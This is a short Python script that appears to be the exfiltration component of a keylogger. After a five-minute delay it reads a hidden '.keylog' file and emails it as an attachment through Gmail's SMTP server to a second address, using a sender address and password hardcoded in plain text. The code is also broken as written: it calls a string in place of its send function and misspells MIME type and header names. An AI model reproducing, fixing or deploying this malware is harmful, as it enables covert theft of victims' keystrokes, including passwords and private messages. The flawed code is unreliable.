import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import time

sender_mail = "atishshah877@gmail.com"
sender_pass = "begula_noob@google123"

content = '''Sending Keylogs'''

to = "atishshah899@gmail.com"

def send_mail():
	message = MIMEMultipart()
	message['From'] = sender_mail
	message['To'] = to
	message['Subject'] = "Keylogs"

	message.attach(MIMEText(content, "plain"))
	attach_file = open(".keylog", "rb")
	payload = MIMEBase("application", "octate-stream")
	payload.set_payload((attach_file).read())
	encoders.encode_base64(payload)

	payload.add_header('Content-Decomposition', 'attachment', filename = "keylog")
	message.attach(payload)

	try:
		smtp_server = smtplib.SMTP("smtp.gmail.com", 587)
		smtp_server.starttls()
		smtp_server.login(sender_mail, sender_pass)
		smtp_server.sendmail(sender_mail, to, message.as_string())
		smtp_server.quit()
		print("Sent")
	except Exception as e:
		print(e)

if __name__ == "__main__":
	time.sleep(300)
	sender_mail()